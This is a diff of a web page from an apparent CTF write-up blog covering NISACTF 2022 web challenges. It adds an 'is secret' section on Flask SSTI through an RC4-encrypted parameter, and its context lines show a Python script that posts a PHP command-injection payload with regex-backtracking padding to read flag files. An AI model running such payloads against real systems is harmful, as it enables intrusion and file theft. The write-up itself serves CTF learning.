@@ -52,8 +52,13 @@
 <meta property="og:image" content="https://21346asz.github.io/CTFwp/NISACTF-2022/image-20250630103103121.png">
 <meta property="og:image" content="https://21346asz.github.io/CTFwp/NISACTF-2022/image-20250630112215449.png">
 <meta property="og:image" content="https://21346asz.github.io/CTFwp/NISACTF-2022/image-20250630190736453.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/NISACTF-2022/image-20250707075838812.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/NISACTF-2022/image-20250707080250151.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/NISACTF-2022/image-20250707080307115.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/NISACTF-2022/image-20250707080215276.png">
+<meta property="og:image" content="https://21346asz.github.io/CTFwp/NISACTF-2022/image-20250707080348400.png">
 <meta property="article:published_time" content="2025-06-22T05:04:23.000Z">
-<meta property="article:modified_time" content="2025-06-30T11:09:44.943Z">
+<meta property="article:modified_time" content="2025-07-07T00:07:57.308Z">
 <meta property="article:author" content="wArn">
 <meta property="article:tag" content="CTFwp">
 <meta name="twitter:card" content="summary">
@@ -157,7 +162,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyupload"><span class="toc-number">2.</span> <span class="toc-text">babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyserialize"><span class="toc-number">3.</span> <span class="toc-text">babyserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#popchains"><span class="toc-number">4.</span> <span class="toc-text">popchains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bingdundun"><span class="toc-number">5.</span> <span class="toc-text">bingdundun~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join-us"><span class="toc-number">6.</span> <span class="toc-text">join-us</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hardsql"><span class="toc-number">7.</span> <span class="toc-text">hardsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-up"><span class="toc-number">8.</span> <span class="toc-text">level-up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#middlerce"><span class="toc-number">9.</span> <span class="toc-text">middlerce</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyupload"><span class="toc-number">2.</span> <span class="toc-text">babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyserialize"><span class="toc-number">3.</span> <span class="toc-text">babyserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#popchains"><span class="toc-number">4.</span> <span class="toc-text">popchains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bingdundun"><span class="toc-number">5.</span> <span class="toc-text">bingdundun~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join-us"><span class="toc-number">6.</span> <span class="toc-text">join-us</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hardsql"><span class="toc-number">7.</span> <span class="toc-text">hardsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-up"><span class="toc-number">8.</span> <span class="toc-text">level-up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#middlerce"><span class="toc-number">9.</span> <span class="toc-text">middlerce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-secret"><span class="toc-number">10.</span> <span class="toc-text">is secret</span></a></li></ol>
       </div>
     
   </span>
@@ -398,6 +403,28 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28934/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^ * ( ~ ` ? /  | &amp; ! &lt; &gt; &#123; [</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`strings /f*`;?&gt;&#x27;</span>+<span class="string">&#x27;%&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;letter&#x27;</span> : payload</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
 
 <img src="/CTFwp/NISACTF-2022/image-20250630190736453.png" class="" title="image-20250630190736453">
+
+<h2 id="is-secret"><a href="#is-secret" class="headerlink" title="is secret"></a>is secret</h2><p>dirsearch扫描的太慢了，就自己试了试别的目录。</p>
+<p>发现有&#x2F;secret目录，通过secret传参出现了报错，猜测开启了debug，又看了一下版本，发现是python2.7.18，一个思路就是flask算pin，还有另一个思路就是下图：</p>
+<img src="/CTFwp/NISACTF-2022/image-20250707075838812.png" class="" title="image-20250707075838812">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#设置密钥 HereIsTreasure</span></span><br><span class="line">deS=rc.do_crypt(secret) <span class="comment"># RC4 加密</span></span><br></pre></td></tr></table></figure>
+
+<p>最后在进行render_template_string渲染，可以进行ssti模板注入。</p>
+<p>RC4加密是对称加密，即2次加密后就是原始数据。</p>
+<p>1 -&gt; d:</p>
+<img src="/CTFwp/NISACTF-2022/image-20250707080250151.png" class="" title="image-20250707080250151">
+
+<p>d -&gt; 1:</p>
+<img src="/CTFwp/NISACTF-2022/image-20250707080307115.png" class="" title="image-20250707080307115">
+
+<p>接下来进行ssti注入：</p>
+<img src="/CTFwp/NISACTF-2022/image-20250707080215276.png" class="" title="image-20250707080215276">
+
+<p> 拿flag：<img src="/CTFwp/NISACTF-2022/image-20250707080348400.png" class="" title="image-20250707080348400"></p>
+<p>flask算pin，我并没有尝试，我也不知道行不行。</p>
+<p>开启了debug，报错可能会泄露出来一些源码。</p>
+
   </div>
 </article>
 
@@ -432,7 +459,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyupload"><span class="toc-number">2.</span> <span class="toc-text">babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyserialize"><span class="toc-number">3.</span> <span class="toc-text">babyserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#popchains"><span class="toc-number">4.</span> <span class="toc-text">popchains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bingdundun"><span class="toc-number">5.</span> <span class="toc-text">bingdundun~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join-us"><span class="toc-number">6.</span> <span class="toc-text">join-us</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hardsql"><span class="toc-number">7.</span> <span class="toc-text">hardsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-up"><span class="toc-number">8.</span> <span class="toc-text">level-up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#middlerce"><span class="toc-number">9.</span> <span class="toc-text">middlerce</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyupload"><span class="toc-number">2.</span> <span class="toc-text">babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyserialize"><span class="toc-number">3.</span> <span class="toc-text">babyserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#popchains"><span class="toc-number">4.</span> <span class="toc-text">popchains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bingdundun"><span class="toc-number">5.</span> <span class="toc-text">bingdundun~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join-us"><span class="toc-number">6.</span> <span class="toc-text">join-us</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hardsql"><span class="toc-number">7.</span> <span class="toc-text">hardsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-up"><span class="toc-number">8.</span> <span class="toc-text">level-up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#middlerce"><span class="toc-number">9.</span> <span class="toc-text">middlerce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-secret"><span class="toc-number">10.</span> <span class="toc-text">is secret</span></a></li></ol>
       </div>
     
 
